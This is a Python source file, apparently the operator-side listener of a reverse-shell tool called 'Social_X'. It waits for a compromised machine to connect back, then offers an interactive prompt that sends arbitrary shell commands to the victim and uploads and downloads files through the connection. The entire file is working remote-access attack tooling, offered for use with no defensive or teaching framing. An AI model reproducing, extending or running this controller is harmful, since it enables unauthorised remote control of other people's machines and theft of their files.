BUFF_SIZE=4096

import socket,sys
import logging
import os
from ipPort import *
import base64
from clint.textui import colored
os.system("bash ../banner/banner.sh")


class outputStuff:
    def __init__(self):
        self.HEADER = '\033[95m'
        self.OKBLUE = '\033[94m'
        self.OKCYAN = '\033[96m'
        self.OKGREEN = '\033[92m'
        self.WARNING = '\033[93m'
        self.FAIL = '\033[91m'
        self.ENDC = '\033[0m'
        self.BOLD = '\033[1m'
        self.UNDERLINE = '\033[4m'
    def connectionOutput(self,address,port):
        logging.basicConfig(format='%(message)s')
        log = logging.getLogger(__name__)
        log.warning(self.BOLD+self.OKGREEN+"[+] There is a connection!!")
        print(self.BOLD+self.OKGREEN+"[IP:"+str(address[0])+" Port:"+str(port)+"]"+self.ENDC)
        print(colored.yellow("Use 'help' to get help."))
        print(self.FAIL+"~SOCIAL_X~\n"+self.ENDC)
    def errorOutput(self):
        logging.basicConfig(format='%(message)s')
        log = logging.getLogger(__name__)
        log.error(self.BOLD+self.FAIL+"Connection Error!")


def cm(connection):
    while True:
        exec_=input(colored.blue("Social_X")+colored.red("@")+colored.yellow(str(socket.gethostname())+colored.red("[")+colored.yellow("~")+colored.red("]")))
        l=exec_.split(" ")
        if exec_=="exit":
            connection.send(str.encode(exec_))
            connection.close()
            sckt.close()
            sys.exit()
        if l[0]=="upload":
            connection.send(l[2].encode())
            with open(str(l[1]),"rb") as f:
                f=f.read()
            
            connection.send(b"upload"+f)
            print(colored.green("[+]Upload Successfull!!"))
        if exec_=="help" or exec_=="'help'":
            print("Dude it's a reverse shell. Just execute your commands what help are you expecting?")
        elif len(str.encode(exec_)) > 0 and l[0]!="upload":
            connection.send(str.encode(exec_))
            data=b''
            while True:
                data_piece=connection.recv(BUFF_SIZE)
                data+=data_piece
                if(b'FILENAME=' in data_piece):
                    file_data=data_piece.split(b"=")
                    file_data=str(str(file_data[1]).split("b'")[1].split("'")[0])
                    
                if len(data_piece) < BUFF_SIZE:
                    
                    break
            if(l[0]=="download"):
                sp=str(l[1]).split("=")
                with open(str(sp[1]),"wb") as wb_F:
                    wb_F.write(data)
                print(colored.green("[+]Download Successfull!!"))
                
            print("----------------------------------------------")
            try:
                print(colored.green(str(data.decode())))
            except UnicodeDecodeError:
                pass
            print("----------------------------------------------")
def socketC(host,port):
    global address
    sckt.bind((host,int(port)))
    sckt.listen(5) # 5 means, if bad connection happens for 5 times, return an error.
    connection,address=sckt.accept()
    oS=outputStuff()
    oS.connectionOutput(address,str(port))
    cm(connection)
    connection.close()
try:
    host=str(f);port=int(f1);sckt=socket.socket()
    socketC(str(host),int(port))
    
except socket.error:
    print(colored.blue("[+]Connection is available but cannot connect right now. Please try it again in 5 minutes."))